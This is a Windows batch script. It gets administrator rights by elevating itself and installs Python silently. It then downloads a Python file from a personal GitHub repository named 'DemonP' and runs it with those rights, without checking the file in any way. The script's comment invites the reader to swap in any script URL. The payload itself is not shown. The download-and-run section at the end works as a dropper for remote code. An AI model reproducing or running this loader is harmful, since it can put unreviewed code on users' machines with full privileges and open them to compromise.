@echo off
:: Combined Script - Installs Python then Runs Python Script from URL
:: Silent Admin Install with Auto-Elevation

:: Check if running as administrator
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Requesting administrative privileges...
    PowerShell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

:: =============================================
:: PART 1: INSTALL LATEST PYTHON SILENTLY
:: =============================================
:INSTALL_PYTHON
echo Installing latest Python version...

:: Set variables for Python installation
set "pythonURL=https://www.python.org/downloads/windows/"
set "tempDir=%TEMP%\PythonInstall"
set "installer=python_installer.exe"

echo Checking for latest Python version...
mkdir "%tempDir%" 2>nul

:: Get latest stable Python installer URL
echo Fetching latest Python download URL...
powershell -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $html = Invoke-WebRequest -Uri '%pythonURL%' -UseBasicParsing; $latest = ($html.Links | Where-Object { $_.href -match 'https://www.python.org/ftp/python/[0-9.]+/python-[0-9.]+-amd64.exe' } | Select-Object -First 1).href; $latest" > "%tempDir%\latest_url.txt"

set /p latestURL=<"%tempDir%\latest_url.txt"

if "%latestURL%"=="" (
    echo Failed to get latest Python download URL
    pause
    exit /b
)

echo Downloading latest Python installer...
echo URL: %latestURL%

powershell -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%latestURL%' -OutFile '%tempDir%\%installer%'"

if not exist "%tempDir%\%installer%" (
    echo Download failed
    pause
    exit /b
)

echo Installing Python silently...
"%tempDir%\%installer%" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0

echo Waiting for installation to complete...
timeout /t 30 /nobreak >nul

echo Verifying Python installation...
where python >nul 2>&1
if %ERRORLEVEL% neq 0 (
    echo Python installation may have failed
    pause
    exit /b
)

echo Python installed successfully!
python --version

:: Clean up Python installer
del /q "%tempDir%\%installer%" >nul 2>&1
rmdir /q "%tempDir%" >nul 2>&1

:: Update PATH immediately for current session
set PATH=%PATH%;C:\Program Files\Python310\Scripts;C:\Program Files\Python310

:: =============================================
:: PART 2: DOWNLOAD AND RUN PYTHON SCRIPT
:: =============================================
:RUN_SCRIPT
echo Proceeding to download and run Python script...

:: Set variables for script download
set "scriptURL=https://github.com/abidsh540/DemonP/raw/refs/heads/main/1F.py"  :: CHANGE THIS TO YOUR SCRIPT URL
set "tempDir=%TEMP%\PythonScriptRunner"
set "scriptName=remote_script.py"

echo Setting up script environment...
mkdir "%tempDir%" 2>nul

echo Downloading Python script from %scriptURL%...
powershell -command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%tempDir%\%scriptName%'"

if not exist "%tempDir%\%scriptName%" (
    echo Failed to download the Python script
    pause
    exit /b
)

echo Executing the Python script...
python "%tempDir%\%scriptName%"

:: Optional: Remove the downloaded script after execution
:: del "%tempDir%\%scriptName%"

echo Script execution completed.
pause